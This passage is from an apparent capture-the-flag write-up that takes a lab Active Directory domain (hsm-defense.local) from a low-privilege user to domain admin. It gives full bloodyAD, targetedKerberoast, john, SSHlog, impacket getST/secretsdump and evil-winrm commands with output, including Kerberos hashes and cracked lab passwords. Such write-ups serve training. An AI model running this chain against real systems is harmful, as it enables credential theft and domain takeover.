nTSecurityDescriptor.ACL.17.Trustee: BUILTIN_ADMINISTRATORS
nTSecurityDescriptor.ACL.17.Right: WRITE_OWNER|WRITE_DACL|GENERIC_READ|DELETE|CONTROL_ACCESS|WRITE_PROP|WRITE_VALIDATED|CREATE_CHILD
nTSecurityDescriptor.ACL.17.ObjectType: Self
nTSecurityDescriptor.ACL.17.Flags: CONTAINER_INHERIT; INHERITED
```

That's a lot of ACL data, but three details matter for what comes next:

1. On **`IT-Tier1`**, `caleb.turner` has an explicit ACE granting `DELETE_CHILD` rights directly on the OU itself (`nTSecurityDescriptor.ACL.3.Trustee: caleb.turner`, `Right: DELETE_CHILD`). That means `caleb.turner` can remove/relocate child objects that currently live inside `IT-Tier1`.
2. On **`IT-Tier2`**, **`IT-Tier3`**, and **`IT-Tier4`**, the group **`IT OU Operators`** holds `GENERIC_ALL` over the OU (with `CONTAINER_INHERIT`, meaning that full control cascades down to every object placed inside it). If `caleb.turner` — or an account we can reach from `caleb.turner` — is a member of `IT OU Operators`, then *anything sitting inside those three OUs* is effectively under our control.
3. Active Directory doesn't have a dedicated "move object" permission — moving an object between OUs is implemented as rewriting its `distinguishedName`, and Windows checks it as **`DELETE_CHILD` on the source OU** plus **`CREATE_CHILD` on the destination OU**. `caleb.turner` already satisfies the first half of that on `IT-Tier1`, and `IT OU Operators`' `GenericAll` satisfies the second half on `IT-Tier3` (`GenericAll` implies `CREATE_CHILD`).

Put together: any user object sitting in `IT-Tier1` can be **relocated into `IT-Tier3`**, at which point it inherits full `GenericAll` control from the `IT OU Operators` ACE — turning a normally out-of-reach account into one we can fully take over. `oscar.mazerath` is one such account sitting in `IT-Tier1`, so we move him:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ bloodyAD --host DC.hsm-defense.local -d hsm-defense.local -k set object 'CN=oscar.mazerath,OU=IT-Tier1,DC=hsm-defense,DC=local' distinguishedName -v 'CN=oscar.mazerath,OU=IT-Tier3,DC=hsm-defense,DC=local'
[+] CN=oscar.mazerath,OU=IT-Tier1,DC=hsm-defense,DC=local's distinguishedName has been updated
```

The rewrite succeeds, and `oscar.mazerath` is now logically a member of `IT-Tier3` — meaning the `IT OU Operators` `GenericAll` ACE on that OU now applies to him. We confirm by simply resetting his password outright:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -k set password oscar.mazerath 'Password123!'
[+] Password changed successfully!
```

It works. We mint a TGT for him and move on:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ impacket-getTGT hsm-defense.local/oscar.mazerath:'Password123!'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in oscar.mazerath.ccache
                                                                                                    
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ export KRB5CCNAME=oscar.mazerath.ccache
```

### Phase 6: Targeted Kerberoasting ryan.cole

`oscar.mazerath` inheriting control from `IT-Tier3`'s `IT OU Operators` ACE means he (or the effective rights that come with reaching this position in the OU tree) can write to other objects governed by the same tier structure — including the Service Principal Name attribute of other accounts. That's exactly what's needed for a **Targeted Kerberoast**: rather than passively waiting for an account to already have an SPN set (classic Kerberoasting), this technique *temporarily sets* a fake SPN on a target account we have write access to, requests a Kerberos service ticket for it (which gets encrypted with a key derived from that account's password), then removes the SPN again to clean up.

`ryan.cole` is the target here:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ ./targetedKerberoast.py -k --dc-host dc.hsm-defense.local -u 'oscar.mazerath' -d 'hsm-defense.local' --request-user 'ryan.cole'               
[*] Starting kerberoast attacks
[*] Attacking user (ryan.cole)
[+] Printing hash for (ryan.cole)
$krb5tgs$18$ryan.cole$HSM-DEFENSE.LOCAL$*hsm-defense.local/ryan.cole*$82918c0cb45c7a3d6662a8a7$dc6a5b8cdac1cc3dc541b696f7795e2b6288cf34ead8ccd60ec689cb81978f7f0ab9c142c84824c8d9d1fb7f30cad22a8e48246453574f9b63ddc36325a4e9eff000c24d1ba8a01c0a76c7e1105bdd155266f20ef7c0a2bb4afd361d833d0b371921a6477630af9b556addaca9a17526c0616fc52c07d3cde3aacf9eb1a276823fa52d6f7e9f516756478ee10cc2c4082baa5d8ea21832df0c66b0a357ea754ad6bcd02c8cff3277d219e1820f712ef2660524f6cad1b899d82ac117f59bd6e7fbaa96c25b3e6ccf58d4e1eb724923b81c54e6cbd478ab925ee67e09d22b5ab79e0be2a0602721e5bbe3e4eb379fbfbb76b91882402a864e9e2fbcfa9a159d9ee1098aa4a28bb12132ec60e87a7ab53db758096dc8317fd34635914e7992c884d05e1676bf51cdc6485a669a99f76108a0585ff06c89fd50d9bb86c6db7711b6e8ecabfd8fa4ef87d5374fe3236c97ea8e6fe3317061f5c5fffde1fd5764108b46090f04722d98d703c0e1a58040ab567369bc286587137e627eedb75ff24ec7704d3f4e5235f3bec60000e51f106b33ab272a8420304aa73db259fffbbf4f509d18bb865e8b0adaddd31b8440d2bb6b4c040a0eeddf722c72259331c13c431d3c0aad8ce9f87d76bf56d94f9aaf83ff9acbd51c2ae243109439ae156ea5db1d5d4b4ac61faf56131f37430db9364270c2632441b5e7b0da91702e040728aa7a884e8ebb088707a12d7209086256e6768b8788305ee6caea80e159608ddb8e915e4a5d736cc2280b00361ccc39ec9abbfbeddf44453da4d74204558f9e4b9998b7fe8363cee3167959882cf74e563c3e5fae1d3e7e56842be77ed8b369e28f3e4800471c6b03d3244a224ea64f96073a42216558dfdaf1e32b4238701262c25fea70549c5299f1d835089fd062f750944ca284769678fdb0596104aa903ec60bd1302410819f5057f8aa3392aab519b86b99ea13856cefd17d6284d966231f6d68f57fdbabd2b3b78b93ce1e24677393679247c12b214ad75ada3e2384d67c104c305812a4ae63ce228696c6afea4c8fbfce8a4dea3d60949eff5694d7e826e7b5ec23e1f58e086c77aba18cc644631d44c4ecf11076861e36d22f260f33bf56f15e2627123fc4d6a22c3e34917e560389978158f9d0a1414a4f9cc3d4df657dbf96ed3177b20fb65fbf21330a253e2b314a7de9d05194e42affc644760cba9c503eeb99cf48ac5d6ce22073b2bdd499b0f1bf0094c8b34a7b9e70d9dfcaeb854ef542eb25730d693ecafff97e02b7a9009f98a8009d8bb78a507d2ef370384398cf761a320e44c5c4d48c62c4e812dad1d56255f2dad2b1dfbd58ff1515b35a6aa2961fd410691717f0a6f07b47977fb81629832ca3588d90f62a4f74d041af0925521b2f250c607b5551b563184c8131b3c44f668db24ab6acc3922dbafd0f2de1f00c556c0fbfb9d33ba14e6091124dd24ec33f3c11b9d9fadfaa5bac5d47bf68631d0e1c733176e1fdd1078a1bba711a2a14e840578198d8e8904eeaa66004b27a9d90bcb94d21e6001047cc2bc77364546060fb6189fb10fdf178c5e96e0b33d1656da3efeaa891873b3f69cf351e4120f3b4652d0e98441b66f69daa844a7cb44f1e511ec4349738dd9363fe63
```

We get a ticket back, but notice the hash type: `$krb5tgs$18$...` — that `18` means the ticket was encrypted using **AES-256** (Kerberos encryption type 18), not the older, much weaker **RC4** (type 23). AES-256-encrypted TGS tickets use a proper key-derivation function and are drastically slower to crack than RC4 ones — often orders of magnitude slower per guess — which makes a straightforward `rockyou.txt` attempt impractical here.

The fix relies on another AD attribute abuse: `msDS-SupportedEncryptionTypes` controls which Kerberos encryption types a given account is *allowed* to use. If we can write to that attribute on `ryan.cole` (which, again, our `IT-Tier3`-derived control lets us do), we can force the account down to RC4-only:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local -k set object ryan.cole msDS-SupportedEncryptionTypes -v 4
[+] ryan.cole's msDS-SupportedEncryptionTypes has been updated
```

Setting the value to `4` corresponds to the `RC4-HMAC` bit flag in the `msDS-SupportedEncryptionTypes` bitmask, meaning any *future* ticket issued for `ryan.cole` must use RC4 instead of AES. We simply repeat the exact same targeted-Kerberoast request:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ ./targetedKerberoast.py -k --dc-host dc.hsm-defense.local -u 'oscar.mazerath' -d 'hsm-defense.local' --request-user 'ryan.cole'
[*] Starting kerberoast attacks
[*] Attacking user (ryan.cole)
[+] Printing hash for (ryan.cole)
$krb5tgs$23$*ryan.cole$HSM-DEFENSE.LOCAL$hsm-defense.local/ryan.cole*$81216c5b3846155195aeb8f3ed7095b7$1ae77038e1a1b5b8587b0476aa6954281f3678967d68381f5248b69cfebb18dedf6dd4efab5df9cb0f7e3f912e9a71cbc4fb90f9bd127ae9d3fcd43b714861738861abf7286e7c51af5676c5a10400c65d833a10f3e6d3c88f059441ac52f8bb650841a9636eed2c2af4868034f950962e4f000800efd6c70efa7737b15fd55f564052cb1c50e9e33576c5d9ad3be4202ef7c5d1b519520a7aae1e7deb5000dcccbeb22dea81bf6aa66a119f170b843a246b662f5a6befc890d3cd525cee96784992720d0fac5d92dea44666e50cf3bfab28ed1e6150cfe88dd66e661841716902f2d04ea295d7306f8d37fad9b5dd54b4232ae71d7311e1780aa527b1cfec6962f307e049e99fd3acd10d7d33c73757ec771500faeb9c12d3c0651d815d1a28f8dbba0f9c8c722db63348bd1cb1552811756c187e920d4172bdfaf0fff83407a0db34dcc0450af999aa2d7cfc7360b003ea9a1ae737a57d196054d5f242403f428e17c190c2c898366d8ff441825c6bdb7194746c68628374e6d704e6e99c773634262457c8842018fdb93cbb6d8a4b1527cb2ee1d0ba6fe2b4c3780b2ebda48d60103ac5d5d2450478dfaa24a93f5af5468410d5fb8196fb3ccfafeecfab8c4e7a79e7811ca2dce88d6b19e8537ede0bddc19add3092e780860638fb04b891c80ad34ab72005ea89b06e21ccc025e6f61b7a0afc2f2a608972e82eddaf7b00290e8aa4fd22a6996762d97a1fde71a96c8d08dde3caddcdfe997495e5ca3e326e4da598f31510d19c20256bf812060f1301b841f18a711a28c95a04ed2b456065b1f317b6dcb756d6c65133195f2155a58deadb2386b675cca63285d2e534f50cbd734c55612bbdbc3c1cbfeea58d33759112fccd620873cd2934b59539a5ff7e8f56e1a8d49ab4a8f25448ad7fa96b972c0716a2c69f204d3acea39a438cc7a8d5a18c01979b8af0534a6bfd0d9d0d5a4b7dca3ed0658ecf08edd1cac13e86fd14a55282519df21595e60a8a2d35e631f1e11e6d59af4932e0112492aa21de97c044a7d583f533330a8416b9ea8a538a38e59d00dd914d5848a3a71b9f6fffaf32a27794ad25e1a0d258c428326f388df6c58286b9036ab41114bd91bfd7b84106774a4918bba930a3856a3c3654e871e981e57b303e0461e558cda4a79900646b0009eef9f4c364b0692f776f4431aeb489cdd4bace1384f0805bf390c2e0b1eabf3ca3529661dd6f352071fcde4d4722cc1156b8d1898be54b3759e0f265ded72697340d7c7d635293afd3042941c18dc8c0028dcfb645717fd6c049aaaf5f013fa575f7eee63859ada11e9d1f21167ef4846185ea5e40bec9663a3b30b9f38725d73c73f79dd7eb087394932c796d01f8519a34779c348b0c04c5aaa2a441445e2f70b237f1034fdfee20cd0be02c6af70c792d4d2fa436c822a3a63a05353b3ef3b6331d7e3cce8ec420d885ba93c8687530df21f08d419a173b73faf5f850d85288b8229d7eb9bf28264c0ec70c7dc73f41db203b18a5429d1c44e288b1f8319bdced8b9af7d60adc85dfba53ad7a50dce75c89d41e8374f2f54b063b02ed425dad1b2efc28bd9a5dabd9e2176feb88bbe6d43fddd3b06fec57e37d8d
```

This time the hash comes back as `$krb5tgs$23$...` — encryption type `23`, RC4 — exactly what we wanted. RC4-based Kerberos hashes use unsalted `MD4`/`HMAC-MD5` under the hood, so `john` tears through this one almost instantly against `rockyou.txt`:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ john ryan_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
napalmcrack      (?)     
1g 0:00:00:06 DONE (2026-09-23 19:55) 0.1447g/s 752736p/s 752736c/s 752736C/s napher..naovis1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

`ryan.cole`'s password is **`napalmcrack`**. As with every other account so far, we grab a Kerberos ticket for the new identity before doing anything else:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ impacket-getTGT hsm-defense.local/ryan.cole:'napalmcrack'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ryan.cole.ccache
                                                                                                                        
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ export KRB5CCNAME=ryan.cole.ccache  
```

### Phase 7: RDP Access & Harvesting ITOPS01$

Up to this point we've stuck to WinRM for interactive access, but `ryan.cole` is a good candidate to try over **RDP** instead — a full desktop session lets us poke around GUI applications, scheduled tasks, and running services in a way a PowerShell-only WinRM session doesn't always surface as naturally. `xfreerdp3` handles the Kerberos ticket we already have cached (`export KRB5CCNAME=ryan.cole.ccache` from the previous step) automatically:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ xfreerdp3 /v:DC.hsm-defense.local /d:HSM-DEFENSE.LOCAL /u:ryan.cole /dynamic-resolution +clipboard /cert:ignore
```

A full graphical session opens up on `DC.hsm-defense.local` as `ryan.cole`. The screenshots below show what's waiting on the desktop.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FOectfanYEPncf3DeKDSW%252FScreenshot%2520%283475%29.png%3Falt%3Dmedia%26token%3Dd39e4158-4f73-4e21-8304-8fcc1275de95\&width=768\&dpr=3\&quality=100\&sign=e4fb22a601a658ad3361efc201c6878b\&sv=3)

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F4I9mSLqcH5yKAA68eqp9%252FScreenshot%2520%283476%29.png%3Falt%3Dmedia%26token%3Dbdaa6e8f-d878-48c9-b053-d88886da3501\&width=768\&dpr=3\&quality=100\&sign=07e0f291702a97a9e35000a98ac05fb9\&sv=3)

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F5dsozwP6hzWlbeY00X9f%252FScreenshot%2520%283477%29.png%3Falt%3Dmedia%26token%3Dfff5759a-6a16-4875-ac6f-e2777f27c0ae\&width=768\&dpr=3\&quality=100\&sign=752f51791bda6870e13b2f3c4c8b23bc\&sv=3)

Poking around `ryan.cole`'s session surfaces something interesting: a scheduled process or script on this host that periodically reaches out over **SSH** using another machine account's credentials — a fairly common (and fairly dangerous) real-world pattern where a Windows host is configured to push backups, logs, or automation to a Linux/network appliance over SSH, with the credentials for that connection baked into a script or scheduled task.

Rather than dig the exact credentials out of a config file, the more reliable way to capture them is to simply **stand up something that looks like the expected SSH endpoint** and let the scheduled connection come to us. The first attempt is a bare netcat listener on port 22, just to confirm something is actually trying to connect and to get a first look at what a connection attempt looks like:

```shell
nc -lnvp 22
```

A connection does come in, but a raw `nc` listener can't complete an actual SSH handshake — it can only show us that *something* tried to talk to port 22, not the credentials being sent. The screenshot below shows that first, incomplete capture.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FjTNc96J4Ym101rQdYIyj%252FScreenshot%2520%283478%29.png%3Falt%3Dmedia%26token%3D276a50fd-cf84-45a1-ad9e-fab853641da3\&width=768\&dpr=3\&quality=100\&sign=bba7388e12ebfbbd047373136ec70d1c\&sv=3)

To actually harvest the credentials, we need a tool that speaks just enough SSH to complete authentication negotiation and log what gets sent — that's exactly what **SSHlog** is for (a minimal fake SSH server that accepts the protocol handshake far enough to capture the username/password an incoming client offers, then logs it and drops the connection). We run it in place of the earlier netcat listener:

```shell
┌──(kuroshiro㉿a1sberg)-[~/Downloads/SSH-Log-main]
└─$ sudo ./SSHlog           
[sudo] password for kuroshiro: 
Thu, 24 Sep 2026 03:39:01 EDT   STARTING SSHLOG 
Thu, 24 Sep 2026 03:39:01 EDT   CREATED LOG FILE         Filename: .ServerLog 
Thu, 24 Sep 2026 03:39:09 EDT   LOGIN ATTEMPT            Address: 10.1.245.74:49912   Client: SSH-2.0-paramiko_4.0.0   Username: ITOPS01$   Password: paSSword2459 
```

And there it is — a connection from `10.1.245.74` (the DC itself) using the paramiko SSH library, authenticating as the machine account **`ITOPS01$`** with the password **`paSSword2459`**. This confirms our theory: some automated process on the DC is configured to SSH out using `ITOPS01$`'s credentials, and by sitting in the path it expected to reach, we captured them in the clear. The screenshot below shows this from the RDP session's perspective.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FLOvmYcehbEFHODRsQQnx%252FScreenshot%2520%283468%29.png%3Falt%3Dmedia%26token%3D9e829052-c4c0-4124-8f64-4e485bcf6586\&width=768\&dpr=3\&quality=100\&sign=c7a752343c1533b3f15de8245e40eb8f\&sv=3)

The computer `ITOPS01` holds `WriteDacl` rights over the service account `SVC_Delegate`. An attacker who controls `ITOPS01` can modify the permissions on `SVC_Delegate`, commonly allowing them to grant themselves **GenericAll**, **ForceChangePassword**, or other rights that lead to full control of the account.

As with every other credential recovered so far, the first move is to mint a Kerberos ticket for the new account:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ impacket-getTGT hsm-defense.local/'ITOPS01$:paSSword2459'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ITOPS01$.ccache
                                                                                                          
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ export KRB5CCNAME=ITOPS01$.ccache 
```

### Phase 8: Constrained Delegation Abuse to Domain Admin

`ITOPS01$` turns out to hold rights over yet another account — this time a service account called **`svc_delegate`** — so we repeat the now-familiar ownership/`GenericAll` pattern (this time it's granted directly rather than needing an ownership hop first):

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local add genericAll svc_delegate ITOPS01$
[+] ITOPS01$ has now GenericAll on svc_delegate
```

With `GenericAll` over `svc_delegate`, resetting its password is trivial:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ bloodyAD -k --host DC.hsm-defense.local -d hsm-defense.local set password 'svc_delegate' 'Password123!'
[+] Password changed successfully!
```

The screenshot below confirms the reset.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FOWgjGWGx4VTtlP7VFaft%252FScreenshot%2520%283480%29.png%3Falt%3Dmedia%26token%3D6228d538-e321-42e0-871b-33692f73c6f3\&width=768\&dpr=3\&quality=100\&sign=439dece2868260a4caa0a300c86d90ce\&sv=3)

This graph shows that the service account `SVC_DELEGATE` holds `GenericWrite` rights over the computer `HELPDESK01`. GenericWrite on a computer object allows an attacker who controls `SVC_DELEGATE` to modify a wide range of attributes on `HELPDESK01`, including potentially setting resource-based constrained delegation, adding service principal names, or altering other security-relevant properties.

Combined with the earlier paths where `HELPDESK01` itself holds `WriteOwner` over the `SERVICEDESK` group, this creates a useful bidirectional link: compromise of the service account can lead to control of the helpdesk computer, which in turn can be used to escalate further into privileged groups and users.

We get a ticket for `svc_delegate` the same way as always:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ impacket-getTGT hsm-defense.local/svc_delegate:'Password123!'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_delegate.ccache
                                                                                                          
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ export KRB5CCNAME=svc_delegate.ccache
```

`svc_delegate`'s name is a strong hint about what it's used for, and sure enough it holds write access to computer objects' delegation-related attributes. This sets up the final, most powerful escalation in the chain: **Resource-Based/Constrained Delegation abuse**.

**Quick primer on constrained delegation with protocol transition:** normally, only a real user's Kerberos ticket can be used to access a service on their behalf. *Constrained delegation* lets a specific service account (or computer account) request tickets to a specific *target* service **on behalf of** an arbitrary user, without ever needing that user's password or ticket — provided two things are configured on the delegating account:

1. `msDS-AllowedToDelegateTo` lists which target Service Principal Names it's allowed to delegate to.
2. The `TRUSTED_TO_AUTH_FOR_DELEGATION` flag in `userAccountControl` allows it to use **S4U2Self** — a Kerberos extension that lets a service request a ticket *to itself* on behalf of any user, purely by naming that user (no password/proof needed), as the first half of "protocol transition."

Since `svc_delegate` has write access to `HELPDESK01$` — the very first machine account we compromised, all the way back in Phase 2 — we configure both of these on it:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ bloodyAD --host DC.hsm-defense.local -d hsm-defense.local -k set object 'HELPDESK01$' -v 'ldap/DC.hsm-defense.local' msDS-AllowedToDelegateTo
[+] HELPDESK01$'s msDS-AllowedToDelegateTo has been updated
```

This sets the allowed delegation target to the domain controller's LDAP service — arguably the single most powerful service to be able to impersonate access to, since LDAP is what Active Directory itself is built on. Next, we flip the UAC flag that enables protocol transition:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ bloodyAD --host DC.hsm-defense.local -d hsm-defense.local -k add uac 'HELPDESK01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
[+] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to HELPDESK01$'s userAccountControl
```

`HELPDESK01$` is now configured for **constrained delegation with protocol transition** to `ldap/DC.hsm-defense.local`. We already have `HELPDESK01$`'s password from the very first Timeroasting crack back in Phase 2 (`Password123`), so we grab a fresh TGT for it:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ impacket-getTGT hsm-defense.local/'HELPDESK01$:Password123'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in HELPDESK01$.ccache
                                                                                                          
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ export KRB5CCNAME=HELPDESK01$.ccache 
```

With that TGT cached, we perform the actual abuse — a chained **S4U2Self → S4U2Proxy** request using Impacket's `getST`:

* `-impersonate Administrator` triggers **S4U2Self**: `HELPDESK01$` asks the KDC for a ticket to itself *as if it were* the `Administrator` user — no `Administrator` credentials needed, this is purely a function of `HELPDESK01$` being trusted for protocol transition.
* That self-ticket is then automatically fed into **S4U2Proxy**, which asks the KDC to swap it for a service ticket to the *actual* delegation target (`-spn ldap/DC.hsm-defense.local`) — allowed because we configured `msDS-AllowedToDelegateTo` for exactly that SPN a moment ago.

The end result is a completely legitimate-looking Kerberos service ticket, granting **`Administrator`-level access to LDAP on the domain controller**, obtained without ever knowing the real Administrator password or hash.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ impacket-getST hsm-defense.local/'HELPDESK01$' -spn ldap/DC.hsm-defense.local -impersonate Administrator -dc-ip DC.hsm-defense.local -k -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@ldap_DC.hsm-defense.local@HSM-DEFENSE.LOCAL.ccache

┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ export KRB5CCNAME=Administrator@ldap_DC.hsm-defense.local@HSM-DEFENSE.LOCAL.ccache
```

With that ticket exported, any tool that authenticates to LDAP will now effectively be treated as `Administrator`. `impacket-secretsdump` targeting the DC over this Kerberos context uses the **DRSUAPI** replication interface — the same interface real Domain Controllers use to replicate `NTDS.dit` between each other — to pull every domain credential straight out of Active Directory (a DCSync-style dump):

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ impacket-secretsdump -k -no-pass DC.hsm-defense.local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

...
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:639428eb318f47dae9703363da3fb30f:::
```

And there it is: the **NTLM hash for the domain `Administrator`** account, dumped directly from `NTDS.dit`. From here, there's no need to crack anything — a **Pass-the-Hash** Kerberos ticket request finishes the job outright:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ impacket-getTGT hsm-defense.local/Administrator -hashes :639428eb318f47dae9703363da3fb30f
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
                                                                                                          
┌──(kuroshiro㉿a1sberg)-[~/HackSmarter/HSMDefense]
└─$ export KRB5CCNAME=Administrator.ccache       
```

With a valid Administrator TGT cached, an `evil-winrm` session on the DC drops us straight into an administrative shell, and the root flag is sitting right there to confirm full domain compromise:

```shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:/Users/Administrator/Desktop/root.txt


[REDACTED]

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠔⠊⠉⣉⡉⢩⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠔⠊⠁⢀⡤⢄⣜⣀⣠⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠄⠊⠁⠀⠀⠀⢀⠞⠀⠀⠀⠀⣹⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠄⠊⠁⠀⠀⠀⠀⠀⠀⢠⠋⠀⠀⠂⠀⠀⡏⠀⠀⢀⡠⢄⣀⣀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠰⠆⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠇⠀⠆⠀⡀⠁⢸⠁⡀⠎⠁⠀⠀⠀⠀⠈⡹
⠀⠀⠀⠀⠀⠀⣀⠔⠈⠀⠀⠀⠀⢉⣵⡶⠒⠠⠤⠴⠭⠥⣭⢽⣉⣉⣉⡉⠐⠒⠒⠂⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⡀⠄⠀⡀⠀⡿⠉⠀⠀⠀⠀⠀⠀⠀⡐⠁
⣀⡤⠐⠊⣿⠭⣀⠀⠀⠀⢀⣀⣤⣷⠏⠀⠀⠀⠀⠀⢠⠚⣠⣬⡟⠭⢭⡽⢛⠟⠙⠒⠒⠂⠦⠤⢤⣀⣀⣀⠀⠀⠀⠀⠀⠰⢷⣶⣴⣤⣤⣤⣀⣀⡇⠀⠀⠀⠀⠀⠀⠀⡰⠁⠀
⠉⠢⣔⠠⠈⠙⠲⢵⣮⠽⠟⠚⢉⡩⠤⠔⠒⠒⠒⠐⠺⠤⠤⠤⣀⣉⣉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠒⠒⠲⢤⣀⣌⠉⠛⠲⢿⣛⡟⡶⣤⣀⠀⠀⠀⡘⠁⠀⠀
